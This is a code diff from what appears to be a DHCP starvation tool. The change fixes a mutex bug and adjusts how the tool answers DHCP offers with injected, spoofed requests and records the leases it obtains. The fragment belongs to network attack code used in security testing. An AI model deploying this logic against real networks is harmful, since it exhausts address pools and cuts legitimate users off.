@@ -56,28 +56,33 @@ void Starvation::recvDhcpMsg(Core *core, PacketInfo *pktInfo, DhcpPacket *dhcp) 
     DhcpPacket packet{};
     DhcpSlot *slot;
     netaddr_mac(chaddr);
-    netaddr_ip(ipReq);
-    netaddr_ip(serverIp);
     char cIp[IPSTRLEN];
     char cMac[ETHSTRLEN];
     int err;
 
     pthread_mutex_lock(&this->mutex);
 
-    if (dhcp->xid != this->lastXid)
+    if (dhcp->xid != this->lastXid) {
+        pthread_mutex_unlock(&this->mutex);
         return;
+    }
 
     memcpy(chaddr.mac, dhcp->chaddr, ETHHWASIZE);
-    ipReq.ip = dhcp->yiaddr;
-    serverIp.ip = dhcp->siaddr;
+    pktInfo->ipSrc.ip = dhcp->yiaddr;
+    pktInfo->ipDst.ip = dhcp_get_option_uint(dhcp, DHCP_SERVER_IDENTIFIER);
+    if (ip_isempty(&pktInfo->ipDst))
+        pktInfo->ipDst.ip = dhcp->siaddr;
+    pktInfo->toServer = true;
 
     if (dhcp_type_equals(dhcp, DHCP_OFFER)) {
         if (core->verbose)
             std::cout << "[--->] DHCP OFFER" << std::endl;
-        dhcp_inject_request((unsigned char *) &packet, &chaddr, &ipReq, this->lastXid, &serverIp, DHCP_FLAGS_BROADCAST);
-        pktInfo->ipSrc.ip = ipReq.ip;
-        pktInfo->ipDst.ip = serverIp.ip;
-        pktInfo->toServer = true;
+        dhcp_inject_request((unsigned char *) &packet,
+                            &chaddr,
+                            &pktInfo->ipSrc,
+                            this->lastXid,
+                            &pktInfo->ipDst,
+                            DHCP_FLAGS_BROADCAST);
         if ((err = core->sendDhcpMsg(&packet, DHCPPKTSIZE, pktInfo)) < 0) {
             std::cerr << "Starvation action(request): " << spark_strerror(err) << std::endl;
             core->stop = true;
@@ -88,9 +93,9 @@ void Starvation::recvDhcpMsg(Core *core, PacketInfo *pktInfo, DhcpPacket *dhcp) 
 
     } else if (dhcp_type_equals(dhcp, DHCP_ACK)) {
         slot = new DhcpSlot;
-        slot->clientIp.ip = ipReq.ip;
+        slot->clientIp = pktInfo->ipSrc;
         memcpy(slot->clientMac.mac, dhcp->chaddr, ETHHWASIZE);
-        slot->serverIp.ip = serverIp.ip;
+        slot->serverIp = pktInfo->ipDst;
         slot->serverMac = pktInfo->phisAddr;
         gettimeofday(&slot->timeStamp, nullptr);
         slot->lease = ntohl(dhcp_get_option_uint(dhcp, DHCP_ADDR_LEASE_TIME));
